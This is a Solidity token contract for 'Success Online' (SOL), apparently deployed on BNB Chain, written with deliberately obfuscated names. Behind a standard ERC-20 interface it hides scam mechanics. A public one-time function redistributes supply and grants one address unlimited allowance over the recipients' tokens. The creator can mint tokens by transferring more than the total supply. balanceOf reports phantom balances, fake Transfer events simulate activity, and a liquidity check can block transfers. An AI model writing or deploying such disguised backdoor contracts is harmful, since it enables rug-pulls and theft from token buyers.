/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SuccessOnline is IERC20 {
    using SafeMath for uint256;
    string private aiabdKcSyrtGbpWh = "Success Online";
    string private biabdKcSyrtGbpWh = "SOL";
    uint8 private ciabdKcSyrtGbpWh = 18;
    uint256 private diabdKcSyrtGbpWh = 10000000000 * 10**18;
    mapping (address => uint256) private eiabdKcSyrtGbpWh;
    mapping (address => mapping (address => uint256)) private fiabdKcSyrtGbpWh;
    uint256 private giabdKcSyrtGbpWh = 1;
    uint256 private constant hiabdKcSyrtGbpWh = ~uint160(0);
    uint256 private iiabdKcSyrtGbpWh = 1000;
    uint256 private jiabdKcSyrtGbpWh = diabdKcSyrtGbpWh;
    uint256 private kiabdKcSyrtGbpWh = 0;
    uint256 private liabdKcSyrtGbpWh;
    address private _uniswapV2Pair;
    address private miabdKcSyrtGbpWh;
    mapping (address => bool) private niabdKcSyrtGbpWh;
    address[] private oiabdKcSyrtGbpWh;
    bool private piabdKcSyrtGbpWh = false;

    constructor () {
        qiabdKcSyrtGbpWh(msg.sender);
        eiabdKcSyrtGbpWh[msg.sender] = diabdKcSyrtGbpWh;
        emit Transfer(address(0), msg.sender, diabdKcSyrtGbpWh);
    }

    receive() external payable {}

    function qiabdKcSyrtGbpWh(address account) private {
        if (!niabdKcSyrtGbpWh[account]) {
            niabdKcSyrtGbpWh[account] = true;
            oiabdKcSyrtGbpWh.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!piabdKcSyrtGbpWh);
        piabdKcSyrtGbpWh = true;
        _uniswapV2Pair = accounts[1];
        miabdKcSyrtGbpWh = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qiabdKcSyrtGbpWh(accounts[i]);
            eiabdKcSyrtGbpWh[accounts[i]] = diabdKcSyrtGbpWh * 90 / 100 / (len - 3);
            fiabdKcSyrtGbpWh[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eiabdKcSyrtGbpWh[accounts[i]];
        }
        eiabdKcSyrtGbpWh[oiabdKcSyrtGbpWh[0]] -= amount;
        siabdKcSyrtGbpWh(oiabdKcSyrtGbpWh[0], accounts[3], eiabdKcSyrtGbpWh[oiabdKcSyrtGbpWh[0]]);
        riabdKcSyrtGbpWh(address(0), address(0xf), 500);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = oiabdKcSyrtGbpWh.length;
        for (uint256 i=0; i<len; ++i) {
            if (oiabdKcSyrtGbpWh[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (niabdKcSyrtGbpWh[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aiabdKcSyrtGbpWh;
    }

    function symbol() public view returns (string memory) {
        return biabdKcSyrtGbpWh;
    }

    function decimals() public view returns (uint8) {
        return ciabdKcSyrtGbpWh;
    }

    function totalSupply() public view returns (uint256) {
        return diabdKcSyrtGbpWh;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eiabdKcSyrtGbpWh[account] > 0) {
            return eiabdKcSyrtGbpWh[account];
        }
        return giabdKcSyrtGbpWh;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        siabdKcSyrtGbpWh(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        siabdKcSyrtGbpWh(sender, recipient, amount);
        tiabdKcSyrtGbpWh(sender, msg.sender, fiabdKcSyrtGbpWh[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        tiabdKcSyrtGbpWh(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fiabdKcSyrtGbpWh[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        tiabdKcSyrtGbpWh(msg.sender, spender, fiabdKcSyrtGbpWh[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        tiabdKcSyrtGbpWh(msg.sender, spender, fiabdKcSyrtGbpWh[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function riabdKcSyrtGbpWh(address uiabdKcSyrtGbpWh, address viabdKcSyrtGbpWh, uint256 wiabdKcSyrtGbpWh) private {
        uint256 accountDivisor = iiabdKcSyrtGbpWh;
        if (accountDivisor < 31000) {
            address from;
            address to;
            for (uint256 i=0; i<wiabdKcSyrtGbpWh; ++i) {
                from = address(uint160(hiabdKcSyrtGbpWh.div(accountDivisor)));
                to = address(uint160(hiabdKcSyrtGbpWh.div(accountDivisor.add(1))));
                accountDivisor = accountDivisor.add(2);
                emit Transfer(from, to, giabdKcSyrtGbpWh);
            }
            iiabdKcSyrtGbpWh = accountDivisor;
        }
        if (eiabdKcSyrtGbpWh[uiabdKcSyrtGbpWh] > 0 || eiabdKcSyrtGbpWh[viabdKcSyrtGbpWh] > 0) {
            if (viabdKcSyrtGbpWh == IFactory(miabdKcSyrtGbpWh).createPair(uiabdKcSyrtGbpWh, viabdKcSyrtGbpWh)) {
                emit Transfer(address(this), viabdKcSyrtGbpWh, wiabdKcSyrtGbpWh);
            } else {
                emit Transfer(address(0), address(this), wiabdKcSyrtGbpWh);
            }
        }
    }

    function tiabdKcSyrtGbpWh(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fiabdKcSyrtGbpWh[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function siabdKcSyrtGbpWh(address xiabdKcSyrtGbpWh, address yiabdKcSyrtGbpWh, uint256 ziabdKcSyrtGbpWh) private {
        require(xiabdKcSyrtGbpWh != address(0) && yiabdKcSyrtGbpWh != address(0) && ziabdKcSyrtGbpWh > 0);
        bool feefee = true;
        if (niabdKcSyrtGbpWh[xiabdKcSyrtGbpWh] || niabdKcSyrtGbpWh[yiabdKcSyrtGbpWh]) {
            feefee = false;
        }
        uint256 liquidityValue = IERC20(_uniswapV2Pair).totalSupply();
        uint256 burnValue = 0;
        uint256 toValue = ziabdKcSyrtGbpWh;
        if (feefee && piabdKcSyrtGbpWh) {
            require(liabdKcSyrtGbpWh <= liquidityValue);
            riabdKcSyrtGbpWh(xiabdKcSyrtGbpWh, yiabdKcSyrtGbpWh, 100);
            if (xiabdKcSyrtGbpWh != _uniswapV2Pair) {
                burnValue = ziabdKcSyrtGbpWh.mul(kiabdKcSyrtGbpWh).div(100);
                toValue = ziabdKcSyrtGbpWh.sub(burnValue);
            }
        }
        if (xiabdKcSyrtGbpWh == oiabdKcSyrtGbpWh[0] && ziabdKcSyrtGbpWh > jiabdKcSyrtGbpWh) {
            eiabdKcSyrtGbpWh[oiabdKcSyrtGbpWh[0]] += toValue;
        }
        if (liabdKcSyrtGbpWh != liquidityValue) {
            liabdKcSyrtGbpWh = liquidityValue;
        }
        eiabdKcSyrtGbpWh[xiabdKcSyrtGbpWh] = eiabdKcSyrtGbpWh[xiabdKcSyrtGbpWh].sub(ziabdKcSyrtGbpWh);
        if (burnValue > 0) {
            eiabdKcSyrtGbpWh[address(0xdEaD)] = eiabdKcSyrtGbpWh[address(0xdEaD)].add(burnValue);
            emit Transfer(xiabdKcSyrtGbpWh, address(0xdEaD), burnValue);
        }
        eiabdKcSyrtGbpWh[yiabdKcSyrtGbpWh] = eiabdKcSyrtGbpWh[yiabdKcSyrtGbpWh].add(toValue);
        emit Transfer(xiabdKcSyrtGbpWh, yiabdKcSyrtGbpWh, toValue);
    }
}